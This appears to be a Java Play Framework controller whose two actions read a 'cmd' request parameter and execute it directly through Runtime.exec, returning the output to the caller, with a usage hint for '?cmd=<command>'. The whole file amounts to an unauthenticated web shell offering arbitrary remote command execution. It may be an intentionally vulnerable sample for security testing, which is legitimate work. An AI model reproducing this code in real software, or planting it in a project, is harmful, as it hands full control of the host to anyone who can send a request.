package controllers;

import play.*;
import play.mvc.*;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.*;

import models.*;

public class Application extends Controller {

    public static void index(String cmd) throws IOException {
        String result = executeCmd(cmd);
        renderArgs.put("result", result);
        render();
    }

    public static void index2() throws IOException {
        String command = params.get("cmd");
        String result = executeCmd(command);
        renderArgs.put("result", result);
        render();
    }

    private static String executeCmd(String command) throws IOException {
        if (command == null) {
            return "no cmd specified. Add '?cmd=<command>' to execute and see result";
        }

        Runtime rt = Runtime.getRuntime();
        String[] commands = command.split(" ");
        Process proc = rt.exec(commands);

        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(proc.getInputStream()));
        StringBuilder result = new StringBuilder();
        String line;
        while ((line = bufferedReader.readLine()) != null) {
            result.append(line);
        }

        return result.toString();
    }

}